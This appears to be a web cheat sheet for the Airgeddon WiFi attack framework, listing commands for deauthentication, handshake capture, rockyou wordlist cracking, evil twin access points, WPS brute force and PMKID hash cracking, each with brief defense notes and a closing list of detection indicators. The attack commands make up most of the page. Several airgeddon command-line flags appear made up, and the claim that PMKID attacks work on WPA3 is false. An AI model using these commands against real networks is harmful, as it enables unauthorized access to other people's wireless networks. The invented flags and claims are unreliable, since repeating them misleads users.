Airgeddon - WiFi Attack Framework

Airgeddon is a comprehensive wireless security testing framework. This page documents its commands for authorized red team assessments and defensive understanding.

Installation and Setup

sudo git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
sudo chmod +x airgeddon.sh
sudo ./airgeddon.sh

Defense Note: Detect suspicious script execution from /tmp or /home directories. Monitor for airgeddon installation attempts.

Launch Interactive Menu

sudo ./airgeddon.sh -h

View all available options and interactive modes available in the framework.

Non-Interactive Mode - Handshake Capture

sudo ./airgeddon.sh -i wlan0 -m h -t BSSID -c CHANNEL -f /path/to/capture

Capture WPA2/WPA3 handshakes in non-interactive mode. Defenders should monitor for repeated connection attempts.

Deauthentication Attack (Educational)

sudo ./airgeddon.sh -i wlan0 -m d -t BSSID

Red Team: Forces clients to disconnect, enabling handshake capture.

Blue Team Defense: Monitor for excessive client disconnects or signal jamming patterns in wireless logs.

Wordlist Dictionary Attack

sudo ./airgeddon.sh -i wlan0 -m c -f /path/to/capture.cap -w /usr/share/wordlists/rockyou.txt

Attempt to crack handshake capture using a wordlist. Defenders: Enforce strong, unique passwords and monitor failed authentication attempts.

Evil Twin (Rogue AP) Creation

sudo ./airgeddon.sh -i wlan0 -m e -s "FakeSSID" -c CHANNEL

Red Team Assessment: Create a fake access point to test client security awareness.

Blue Team Defense: Implement certificate pinning, HSTS, and teach users to verify network legitimacy.

Monitor Mode Activation

sudo airmon-ng start wlan0

Enable monitor mode on wireless interface (required for most Airgeddon functions). Defenders should alert on unusual interface modes.

Check Available Networks

sudo airodump-ng wlan0mon

Scan for all visible wireless networks. Use to identify target networks for authorized testing.

WiFi Channel Monitoring

sudo airodump-ng -c CHANNEL -b BSSID -w /tmp/airgeddon/captures/ wlan0mon

Monitor specific channel and BSSID. Defenders: Watch for unusual channel hopping patterns.

Bruteforce PIN Attack (WPS)

sudo ./airgeddon.sh -i wlan0 -m w -t BSSID

Attempt WPS brute force on compatible routers. Defense: Disable WPS on all devices when possible.

Packet Injection Test

sudo aireplay-ng --test wlan0mon

Test if your adapter supports packet injection (required for deauth and other attacks).

PMKID Attack (WiFi Network Discovery)

sudo hcxdumptool -i wlan0mon --active_beacon --enable_status=15 -o /tmp/pmkid.pcap
sudo hcxpcaptool -z /tmp/pmkid.16800 /tmp/pmkid.pcap
sudo hashcat -m 16800 -a 3 /tmp/pmkid.16800 ?a?a?a?a?a?a?a?a

Modern attack on WPA3 and WPA2 networks. Defense: Use strong, complex passwords and keep firmware updated.

Restore Normal Mode

sudo airmon-ng stop wlan0mon
sudo systemctl restart networking

Disable monitor mode and restore normal wireless operations.

Blue Team: Network Detection Signatures

Watch for these indicators:

  • Rapid client disconnections (deauth attack)
  • Duplicate SSID broadcasts (evil twin)
  • Unusual WPS activity or brute force attempts
  • Excessive beacon frames on single channel
  • Monitor interface changes on wireless adapters
  • Suspicious processes launching airmon-ng or airodump-ng
